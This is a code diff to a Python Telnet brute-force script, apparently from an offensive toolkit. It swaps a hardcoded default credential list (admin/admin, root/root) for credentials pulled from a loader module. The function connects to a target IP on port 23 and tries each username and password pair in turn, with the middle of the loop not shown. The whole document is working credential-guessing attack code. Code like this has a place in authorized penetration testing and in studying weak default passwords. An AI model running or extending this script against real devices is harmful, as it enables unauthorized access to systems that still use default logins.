@@ -1,8 +1,10 @@
-# bruteforce/telnet_bruteforce.py
 import telnetlib
+from bruteforce.credentials_loader import load_credentials
 
-def telnet_bruteforce(ip, port=23, creds=[('admin', 'admin'), ('root', 'root')]):
+def telnet_bruteforce(ip, port=23):
+    creds = load_credentials()
     print(f"[*] Trying Telnet brute-force on {ip}:{port}")
+
     for username, password in creds:
         try:
             tn = telnetlib.Telnet(ip, port, timeout=3)
@@ -18,5 +20,6 @@ def telnet_bruteforce(ip, port=23, creds=[('admin', 'admin'), ('root', 'root')])
             tn.close()
         except Exception:
             continue
+
     print("[-] No valid Telnet credentials found.")
     return None
